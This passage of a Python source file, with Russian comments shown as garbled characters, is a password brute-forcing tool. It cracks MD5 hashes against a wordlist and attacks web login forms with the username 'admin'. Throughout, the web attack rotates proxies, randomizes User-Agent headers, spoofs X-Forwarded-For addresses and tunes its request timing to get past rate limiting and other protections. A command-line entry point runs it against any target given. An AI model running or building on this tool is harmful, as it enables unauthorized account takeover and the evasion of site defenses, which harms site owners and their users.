        logger.info(f"Verified: {len(self.good_proxies)} good, {len(self.proxies) - len(self.good_proxies)} bad proxies")
    
    def get_proxy(self) -> Optional[str]:
        """–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ª—É—á–∞–π–Ω–æ–≥–æ —Ä–∞–±–æ—á–µ–≥–æ –ø—Ä–æ–∫—Å–∏"""
        if not self.good_proxies:
            return None
        
        self.rotation_count += 1
        if self.rotation_count % 10 == 0:
            random.shuffle(self.good_proxies)
        
        return random.choice(self.good_proxies)
    
    def mark_bad_proxy(self, proxy: str):
        """–ü–æ–º–µ—Ç–∏—Ç—å –ø—Ä–æ–∫—Å–∏ –∫–∞–∫ –ø–ª–æ—Ö–æ–π"""
        if proxy in self.good_proxies:
            self.good_proxies.remove(proxy)
        self.bad_proxies.add(proxy)
        logger.warning(f"Marked proxy as bad: {proxy}")

class AdaptiveStrategyManager:
    """–ú–µ–Ω–µ–¥–∂–µ—Ä –∞–¥–∞–ø—Ç–∏–≤–Ω—ã—Ö —Å—Ç—Ä–∞—Ç–µ–≥–∏–π –∞—Ç–∞–∫–∏"""
    
    def __init__(self):
        self.current_strategy = "direct"
        self.strategy_history = []
        self.failures = 0
        self.success_rate = 0.0
        self.last_adaptation = time.time()
    
    def detect_protection_level(self, responses: List[Dict]) -> ProtectionLevel:
        """–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —É—Ä–æ–≤–Ω—è –∑–∞—â–∏—Ç—ã –Ω–∞ –æ—Å–Ω–æ–≤–µ –æ—Ç–≤–µ—Ç–æ–≤"""
        error_count = sum(1 for r in responses if r.get('status', 200) >= 400)
        success_rate = 1 - (error_count / max(len(responses), 1))
        
        if success_rate > 0.8:
            return ProtectionLevel.NONE
        elif success_rate > 0.5:
            return ProtectionLevel.WEAK
        elif success_rate > 0.2:
            return ProtectionLevel.MEDIUM
        elif success_rate > 0.05:
            return ProtectionLevel.STRONG
        else:
            return ProtectionLevel.VERY_STRONG
    
    def adapt_strategy(self, protection_level: ProtectionLevel) -> Dict:
        """–ê–¥–∞–ø—Ç–∞—Ü–∏—è —Å—Ç—Ä–∞—Ç–µ–≥–∏–∏ based on —É—Ä–æ–≤–Ω—è –∑–∞—â–∏—Ç—ã"""
        strategies = {
            ProtectionLevel.NONE: {
                'delay': 0.01,
                'concurrency': 100,
                'proxy_rotate': False,
                'user_agent_rotate': False
            },
            ProtectionLevel.WEAK: {
                'delay': 0.1,
                'concurrency': 50,
                'proxy_rotate': True,
                'user_agent_rotate': True
            },
            ProtectionLevel.MEDIUM: {
                'delay': 0.5,
                'concurrency': 20,
                'proxy_rotate': True,
                'user_agent_rotate': True,
                'random_delay': True
            },
            ProtectionLevel.STRONG: {
                'delay': 2.0,
                'concurrency': 10,
                'proxy_rotate': True,
                'user_agent_rotate': True,
                'random_delay': True,
                'change_patterns': True
            },
            ProtectionLevel.VERY_STRONG: {
                'delay': 5.0,
                'concurrency': 5,
                'proxy_rotate': True,
                'user_agent_rotate': True,
                'random_delay': True,
                'change_patterns': True,
                'deep_analysis': True
            }
        }
        
        return strategies[protection_level]

class UltimateBruteForcer:
    """–ò–Ω—Ç–µ–ª–ª–µ–∫—Ç—É–∞–ª—å–Ω—ã–π –≥–∏–±—Ä–∏–¥–Ω—ã–π –±—Ä—É—Ç—Ñ–æ—Ä—Å–µ—Ä —Å CPU-—É—Å–∫–æ—Ä–µ–Ω–∏–µ–º"""
    
    def __init__(self, target: str, wordlist: List[str], attack_type: AttackType = AttackType.HASH):
        self.target = target
        self.original_wordlist = wordlist
        self.attack_type = attack_type
        self.wordlist = []
        self.found = False
        self.result = None
        
        # –ö–æ–º–ø–æ–Ω–µ–Ω—Ç—ã —Å–∏—Å—Ç–µ–º—ã
        self.proxy_manager = ProxyManager()
        self.rule_engine = RuleEngine()
        self.pattern_matcher = FastPatternMatcher()
        self.strategy_manager = AdaptiveStrategyManager()
        self.ua = UserAgent()
        self.rate_limiter = RateLimiter(max_requests_per_second=50.0)
        self.cpu_accelerator = CPUAccelerator()
        self.vector_hasher = VectorizedHasher()
        self.time_estimator = TimeEstimator()
        self.advisor = IntelligentAdvisor()
        
        # –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞
        self.stats = {
            'attempts': 0,
            'successes': 0,
            'errors': 0,
            'start_time': time.time(),
            'proxy_rotations': 0,
            'current_index': 0
        }
        
        # –¢–µ–∫—É—â–∞—è —Å—Ç—Ä–∞—Ç–µ–≥–∏—è
        self.current_strategy = {
            'delay': 0.1,
            'concurrency': 50,
            'proxy_rotate': True,
            'user_agent_rotate': True,
            'use_cpu_acceleration': True,
            'batch_size': 1000
        }
    
    def enhance_wordlist(self):
        """–£–ª—É—á—à–µ–Ω–∏–µ —Å–ª–æ–≤–∞—Ä—è —Å –ø–æ–º–æ—â—å—é –ø—Ä–∞–≤–∏–ª"""
        logger.info("Enhancing wordlist with rules...")
        
        if len(self.original_wordlist) > 5000:
            # –î–ª—è –±–æ–ª—å—à–∏—Ö —Å–ª–æ–≤–∞—Ä–µ–π –∏—Å–ø–æ–ª—å–∑—É–µ–º –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω—É—é –æ–±—Ä–∞–±–æ—Ç–∫—É
            self.wordlist = self.rule_engine.parallel_enhance(self.original_wordlist)
        else:
            self.wordlist = self.rule_engine.enhance_wordlist(self.original_wordlist)
        
        logger.info(f"Enhanced wordlist size: {len(self.wordlist)}")
    
    async def setup_proxies(self, proxy_file: str = None, proxy_list: List[str] = None):
        """–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ø—Ä–æ–∫—Å–∏ —Å –ø—Ä–æ–≤–µ—Ä–∫–æ–π"""
        self.proxy_manager.load_proxies(proxy_file, proxy_list)
        await self.proxy_manager.verify_all_proxies()
    
    async def try_password_hash(self, password: str) -> bool:
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è –¥–ª—è —Ö–µ—à–∞"""
        password_hash = hashlib.md5(password.encode()).hexdigest()
        self.stats['attempts'] += 1
        return password_hash == self.target
    
    async def batch_hash_attack(self) -> Optional[str]:
        """–ü–∞–∫–µ—Ç–Ω–∞—è –∞—Ç–∞–∫–∞ –Ω–∞ —Ö–µ—à —Å CPU-—É—Å–∫–æ—Ä–µ–Ω–∏–µ–º"""
        logger.info("Starting batch hash attack with CPU acceleration...")
        
        batch_size = self.current_strategy.get('batch_size', 1000)
        chunks = [self.wordlist[i:i + batch_size] for i in range(0, len(self.wordlist), batch_size)]
        
        for i, chunk in enumerate(chunks):
            if self.found:
                break
            
            logger.info(f"Processing batch {i+1}/{len(chunks)} ({len(chunk)} passwords)")
            
            # –ò—Å–ø–æ–ª—å–∑—É–µ–º CPU-—É—Å–∫–æ—Ä–µ–Ω–∏–µ –¥–ª—è –ø–∞–∫–µ—Ç–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç–∫–∏
            result = self.cpu_accelerator.parallel_hash_check(self.target, [chunk])
            
            if result:
                self.found = True
                return result
            
            # –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –±–∞—Ç—á–∞–º–∏
            await asyncio.sleep(0.01)
        
        return None
    
    async def vectorized_hash_attack(self) -> Optional[str]:
        """–í–µ–∫—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω–∞—è –∞—Ç–∞–∫–∞ –Ω–∞ —Ö–µ—à"""
        logger.info("Starting vectorized hash attack...")
        
        batch_size = 5000
        passwords_array = np.array(self.wordlist)
        
        for i in range(0, len(passwords_array), batch_size):
            if self.found:
                break
            
            batch = passwords_array[i:i + batch_size]
            logger.info(f"Processing vectorized batch {i//batch_size + 1}/{(len(passwords_array)-1)//batch_size + 1}")
            
            # –í–µ–∫—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω–æ–µ –≤—ã—á–∏—Å–ª–µ–Ω–∏–µ —Ö–µ—à–µ–π
            hashes = self.vector_hasher.vectorized_hash_batch(batch.tolist(), "md5")
            
            # –í–µ–∫—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–π –ø–æ–∏—Å–∫ —Å–æ–≤–ø–∞–¥–µ–Ω–∏–π
            result = self.vector_hasher.find_hash_match_vectorized(self.target, hashes, batch)
            
            if result:
                self.found = True
                return result
            
            self.stats['attempts'] += len(batch)
            await asyncio.sleep(0.001)
        
        return None
    
    async def try_password_web(self, password: str, session: aiohttp.ClientSession) -> Dict:
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è –¥–ª—è –≤–µ–±-—Ñ–æ—Ä–º—ã"""
        try:
            data = {
                'username': 'admin',
                'password': password,
                'csrf': 'dummy_token'
            }
            
            headers = {
                'User-Agent': self.ua.random,
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }
            
            async with session.post(self.target, data=data, headers=headers, timeout=30) as response:
                text = await response.text()
                success = response.status == 200 and 'invalid' not in text.lower()
                
                result = {
                    'success': success,
                    'status': response.status,
                    'text': text[:200],
                    'password': password
                }
                
                protection = self.pattern_matcher.analyze_response(text, response.status)
                if protection:
                    self.adapt_to_protection(protection)
                
                return result
                
        except aiohttp.ClientError as e:
            logger.warning(f"Network error for {password}: {e}")
            return {'success': False, 'error': 'network_error'}
        except Exception as e:
            logger.error(f"Unexpected error for {password}: {e}")
            return {'success': False, 'error': 'unexpected_error'}
    
    def adapt_to_protection(self, protection_strategy: Dict):
        """–ê–¥–∞–ø—Ç–∞—Ü–∏—è –∫ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–Ω–æ–π –∑–∞—â–∏—Ç–µ"""
        logger.warning(f"Adapting to protection: {protection_strategy}")
        self.current_strategy.update(protection_strategy)
    
    async def hash_attack(self) -> Optional[str]:
        """–ê—Ç–∞–∫–∞ –Ω–∞ —Ö–µ—à —Å –≤—ã–±–æ—Ä–æ–º —Å—Ç—Ä–∞—Ç–µ–≥–∏–∏"""
        if self.current_strategy.get('use_cpu_acceleration', True):
            if len(self.wordlist) > 10000:
                # –î–ª—è –±–æ–ª—å—à–∏—Ö —Å–ª–æ–≤–∞—Ä–µ–π –∏—Å–ø–æ–ª—å–∑—É–µ–º –≤–µ–∫—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–π –ø–æ–¥—Ö–æ–¥
                return await self.vectorized_hash_attack()
            else:
                # –î–ª—è —Å—Ä–µ–¥–Ω–∏—Ö —Å–ª–æ–≤–∞—Ä–µ–π –∏—Å–ø–æ–ª—å–∑—É–µ–º –ø–∞–∫–µ—Ç–Ω—É—é –æ–±—Ä–∞–±–æ—Ç–∫—É
                return await self.batch_hash_attack()
        else:
            # –°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π –ø–æ–¥—Ö–æ–¥
            logger.info("Starting sequential hash attack...")
            for password in self.wordlist:
                if self.found:
                    break
                    
                if await self.try_password_hash(password):
                    self.found = True
                    return password
                
                await asyncio.sleep(self.current_strategy['delay'])
            
            return None
    
    async def web_attack(self) -> Optional[str]:
        """–ê—Ç–∞–∫–∞ –Ω–∞ –≤–µ–±-—Ñ–æ—Ä–º—É"""
        logger.info("Starting web attack...")
        
        for i, password in enumerate(self.wordlist[self.stats['current_index']:], start=self.stats['current_index']):
            if self.found:
                break
            
            await self.rate_limiter.acquire()
            
            proxy = self.proxy_manager.get_proxy() if self.current_strategy['proxy_rotate'] else None
            connector = ProxyConnector.from_url(proxy) if proxy else None
            
            try:
                async with aiohttp.ClientSession(connector=connector) as session:
                    result = await self.try_password_web(password, session)
                    
                    self.stats['attempts'] += 1
                    self.stats['current_index'] = i + 1
                    
                    if result.get('success'):
                        self.found = True
                        logger.info(f"‚úÖ Password found: {password}")
                        return password
                    
                    if self.stats['attempts'] % 100 == 0:
                        logger.info(f"Attempts: {self.stats['attempts']}, Last password: {password}")
                    
                    if self.stats['attempts'] % 500 == 0:
                        self.save_progress()
                
            except Exception as e:
                logger.error(f"Error processing {password}: {e}")
            
            delay = self.current_strategy['delay']
            if self.current_strategy.get('random_delay'):
                delay *= random.uniform(0.5, 1.5)
            
            await asyncio.sleep(delay)
            
            if self.stats['attempts'] % 100 == 0:
                self.adapt_based_on_stats()
        
        return None
    
    def adapt_based_on_stats(self):
        """–ê–¥–∞–ø—Ç–∞—Ü–∏—è —Å—Ç—Ä–∞—Ç–µ–≥–∏–∏ based on —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏"""
        success_rate = self.stats['successes'] / max(self.stats['attempts'], 1)
        
        if success_rate < 0.1:
            self.current_strategy['delay'] *= 1.5
            self.current_strategy['concurrency'] = max(5, self.current_strategy['concurrency'] - 5)
            logger.info("Reducing speed due to low success rate")
    
    def save_progress(self, filename: str = "progress.pkl"):
        """–°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–µ—Å—Å–∞ –∞—Ç–∞–∫–∏"""
        progress = {
            'attempts': self.stats['attempts'],
            'current_index': self.stats.get('current_index', 0),
            'found': self.found,
            'bad_proxies': list(self.proxy_manager.bad_proxies),
            'timestamp': time.time()
        }
        
        with open(filename, 'wb') as f:
            pickle.dump(progress, f)
        
        logger.info(f"Progress saved: attempts={progress['attempts']}, index={progress['current_index']}")
    
    def load_progress(self, filename: str = "progress.pkl"):
        """–ó–∞–≥—Ä—É–∑–∫–∞ –ø—Ä–æ–≥—Ä–µ—Å—Å–∞ –∞—Ç–∞–∫–∏"""
        if Path(filename).exists():
            try:
                with open(filename, 'rb') as f:
                    progress = pickle.load(f)
                    self.stats['attempts'] = progress['attempts']
                    self.stats['current_index'] = progress['current_index']
                    self.found = progress['found']
                    self.proxy_manager.bad_proxies = set(progress['bad_proxies'])
                logger.info(f"Progress loaded: attempts={progress['attempts']}, index={progress['current_index']}")
            except Exception as e:
                logger.error(f"Failed to load progress: {e}")
    
    async def analyze_attack_feasibility(self) -> Dict[str, Any]:
        """–ê–Ω–∞–ª–∏–∑ —Ü–µ–ª–µ—Å–æ–æ–±—Ä–∞–∑–Ω–æ—Å—Ç–∏ –∞—Ç–∞–∫–∏"""
        analysis = {}
        
        if self.attack_type == AttackType.HASH:
            # –û—Ü–µ–Ω–∫–∞ –¥–ª—è hash-–∞—Ç–∞–∫–∏
            estimation = self.time_estimator.estimate_hash_time(
                self.target, len(self.wordlist), 'cpu'
            )
            
            analysis.update(estimation)
            analysis['recommendations'] = self.time_estimator.get_recommendations(
                'hash', estimation['estimated_time'], len(self.wordlist), estimation
            )
            
            # –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤
            complexity = self.time_estimator._get_complexity_level(len(self.wordlist))
            analysis['recommended_tools'] = self.advisor.recommend_tools(
                'hash', complexity, estimation['estimated_time']
            )
        
        elif self.attack_type == AttackType.WEB:
            # –û—Ü–µ–Ω–∫–∞ –¥–ª—è web-–∞—Ç–∞–∫–∏ (–ø—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ–º —Å—Ä–µ–¥–Ω–∏–π —É—Ä–æ–≤–µ–Ω—å –∑–∞—â–∏—Ç—ã)
            estimation = self.time_estimator.estimate_web_time(
                self.target, len(self.wordlist), ProtectionLevel.MEDIUM
            )
            
            analysis.update(estimation)
            analysis['recommendations'] = self.time_estimator.get_recommendations(
                'web', estimation['estimated_time'], len(self.wordlist), estimation
            )
        
        return analysis
    
    async def print_attack_analysis(self):
        """–ö—Ä–∞—Å–∏–≤—ã–π –≤—ã–≤–æ–¥ –∞–Ω–∞–ª–∏–∑–∞ –∞—Ç–∞–∫–∏"""
        analysis = await self.analyze_attack_feasibility()
        
        print(f"\n{'='*60}")
        print("üéØ –ê–ù–ê–õ–ò–ó –¶–ï–õ–ï–°–û–û–ë–†–ê–ó–ù–û–°–¢–ò –ê–¢–ê–ö–ò")
        print(f"{'='*60}")
        
        print(f"üìä –û–±—ä–µ–º —Ä–∞–±–æ—Ç—ã: {analysis.get('total_operations', 0):,} –æ–ø–µ—Ä–∞—Ü–∏–π")
        print(f"‚è±Ô∏è –û—Ü–µ–Ω–æ—á–Ω–æ–µ –≤—Ä–µ–º—è: {analysis.get('formatted_time', 'N/A')}")
        
        if 'operations_per_sec' in analysis:
            print(f"‚ö° –°–∫–æ—Ä–æ—Å—Ç—å: {analysis['operations_per_sec']:,.0f} –æ–ø/—Å–µ–∫")
        elif 'requests_per_sec' in analysis:
            print(f"‚ö° –°–∫–æ—Ä–æ—Å—Ç—å: {analysis['requests_per_sec']:,.1f} –∑–∞–ø—Ä–æ—Å–æ–≤/—Å–µ–∫")
        
        print(f"\nüí° –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–ò:")
        for rec in analysis.get('recommendations', []):
            print(f"   {rec}")
        
        if 'recommended_tools' in analysis:
            print(f"\nüõ†Ô∏è –†–ï–ö–û–ú–ï–ù–î–£–ï–ú–´–ï –ò–ù–°–¢–†–£–ú–ï–ù–¢–´:")
            for tool in analysis['recommended_tools'][:3]:  # –¢–æ–ø-3 –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞
                print(f"   {tool['name']} (—ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: {tool['effectiveness']}/1.0) - {tool['reason']}")
        
        print(f"{'='*60}")
        
        return analysis
    
    async def run_attack(self) -> AttackResult:
        """–ó–∞–ø—É—Å–∫ –∏–Ω—Ç–µ–ª–ª–µ–∫—Ç—É–∞–ª—å–Ω–æ–π –∞—Ç–∞–∫–∏"""
        logger.info(f"üöÄ Starting {self.attack_type.value} attack with CPU acceleration")
        logger.info(f"üìä Wordlist: {len(self.wordlist)} passwords")
        logger.info(f"üåê Proxies: {len(self.proxy_manager.good_proxies)} available")
        logger.info(f"‚ö° Strategy: {self.current_strategy}")
        logger.info(f"üî¢ CPU Workers: {self.cpu_accelerator.max_workers}")
        
        # –°–Ω–∞—á–∞–ª–∞ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∞–Ω–∞–ª–∏–∑
        print("\n" + "="*60)
        print("üîç –ü–†–ï–î–í–ê–†–ò–¢–ï–õ–¨–ù–´–ô –ê–ù–ê–õ–ò–ó –ê–¢–ê–ö–ò")
        print("="*60)
        analysis = await self.print_attack_analysis()
        
        # –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –µ—Å–ª–∏ –≤—Ä–µ–º—è –±–æ–ª—å—à–æ–µ
        if analysis.get('estimated_time', 0) > 3600:  # –±–æ–ª—å—à–µ 1 —á–∞—Å–∞
            response = input("\nüöÄ –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å –∞—Ç–∞–∫—É? (y/n): ")
            if response.lower() != 'y':
                print("–ê—Ç–∞–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º.")
                return AttackResult(success=False, attempts=0, time_taken=0.0)
        
        start_time = time.time()
        
        try:
            if self.attack_type == AttackType.HASH:
                result = await self.hash_attack()
            elif self.attack_type == AttackType.WEB:
                self.load_progress()
                result = await self.web_attack()
            else:
                raise ValueError(f"Unsupported attack type: {self.attack_type}")
            
            end_time = time.time()
            
            return AttackResult(
                success=result is not None,
                password=result,
                attempts=self.stats['attempts'],
                time_taken=end_time - start_time,
                strategy_used=self.current_strategy.get('name', 'adaptive')
            )
            
        except Exception as e:
            logger.error(f"Attack failed: {e}")
            return AttackResult(success=False, attempts=self.stats['attempts'])
        finally:
            self.save_progress("final_progress.pkl")

# –ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è
async def main():
    print("=== INTELLIGENT BRUTEFORCER WITH TIME ESTIMATION ===")
    
    # –ü–∞—Ä—Å–∏–Ω–≥ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏
    import argparse
    parser = argparse.ArgumentParser(description='Ultimate BruteForcer with AI Analysis')
    parser.add_argument('--target', required=True, help='Target hash or URL')
    parser.add_argument('--type', required=True, choices=['hash', 'web', 'ssh'], help='Attack type')
    parser.add_argument('--wordlist', required=True, help='Path to wordlist file')
    parser.add_argument('--username', help='Username for web/ssh attacks')
    parser.add_argument('--proxies', help='Path to proxies file')
    
    args = parser.parse_args()
    
    # –ó–∞–≥—Ä—É–∑–∫–∞ —Å–ª–æ–≤–∞—Ä—è –∏–∑ —Ñ–∞–π–ª–∞
    try:
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            wordlist = [line.strip() for line in f if line.strip()]
        logger.info(f"Loaded wordlist with {len(wordlist)} passwords")
    except FileNotFoundError:
        logger.error(f"Wordlist file {args.wordlist} not found!")
        return
    except Exception as e:
        logger.error(f"Error loading wordlist: {e}")
        return
    
    # –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ç–∏–ø–∞ –∞—Ç–∞–∫–∏
    attack_type_map = {
        'hash': AttackType.HASH,
        'web': AttackType.WEB,
        'ssh': AttackType.SSH
    }
    
    # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±—Ä—É—Ç—Ñ–æ—Ä—Å–µ—Ä–∞
    bruteforcer = UltimateBruteForcer(
        target=args.target,
        wordlist=wordlist,
        attack_type=attack_type_map[args.type]
    )
    
    # –£–ª—É—á—à–∞–µ–º —Å–ª–æ–≤–∞—Ä—å
    bruteforcer.enhance_wordlist()
    
    # –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º –ø—Ä–æ–∫—Å–∏
    if args.proxies:
        try:
            await bruteforcer.setup_proxies(proxy_file=args.proxies)
        except Exception as e:
            logger.warning(f"Proxy setup failed: {e}, using direct connection")
    else:
        logger.info("No proxies specified, using direct connection")
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –∞—Ç–∞–∫—É —Å –∞–Ω–∞–ª–∏–∑–æ–º
    result = await bruteforcer.run_attack()
    
    # –í—ã–≤–æ–¥ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
    print(f"\n{'='*50}")
    print(f"üéØ –†–ï–ó–£–õ–¨–¢–ê–¢–´ –ê–¢–ê–ö–ò")
    print(f"{'='*50}")
    print(f"–£—Å–ø–µ—Ö: {result.success}")
    if result.success:
        print(f"–ù–∞–π–¥–µ–Ω –ø–∞—Ä–æ–ª—å: {result.password}")
    print(f"–ü–æ–ø—ã—Ç–æ–∫: {result.attempts:,}")
    print(f"–í—Ä–µ–º—è: {result.time_taken:.2f} —Å–µ–∫")
    if result.time_taken > 0:
        print(f"–°–∫–æ—Ä–æ—Å—Ç—å: {result.attempts/result.time_taken:.0f} –ø–æ–ø—ã—Ç–æ–∫/—Å–µ–∫")
    print(f"–°—Ç—Ä–∞—Ç–µ–≥–∏—è: {result.strategy_used}")
    print(f"{'='*50}")

if __name__ == "__main__":
    # –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏: 
    # pip install aiohttp aiohttp-socks fake-useragent uvloop numpy
    
    asyncio.run(main())